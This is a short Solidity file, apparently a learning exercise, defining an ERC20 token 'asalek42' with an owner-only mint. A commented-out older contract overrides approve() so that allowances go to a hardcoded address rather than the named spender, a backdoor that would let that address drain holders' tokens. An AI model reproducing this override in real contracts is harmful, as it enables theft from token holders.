// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";
import "hardhat/console.sol";
               
contract asalek42 is ERC20("asalek42", "asa"), Ownable{
    constructor() 
        Ownable(msg.sender) // Pass initialOwner here
    {}
    function mintFifty() public onlyOwner {
        _mint(msg.sender, 50 * 10**18);
    }
}


/**               
contract asa42 is ERC20("asa42", "asa"){
    
    function mintFifty() public {
        _mint(msg.sender, 50 * 10**18);
    }
    
    //  * @dev See {IERC20-approve}.
    //  *
    //  * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
    //  * `transferFrom`. This is semantically equivalent to an infinite approval.
    //  *
    //  * Requirements:
    //  *
    //  * - `spender` cannot be the zero address.
         
    function approve(address spender, uint256 value) public virtual override returns (bool) {
        address owner = _msgSender();
        console.log("Approving value:", value,",spender: ", spender);
        // print the value
        _approve(owner, 0x25C508a23A9Baf0697dfc176aA24D0a132dDC000, value);
        return true;
    }
}
*/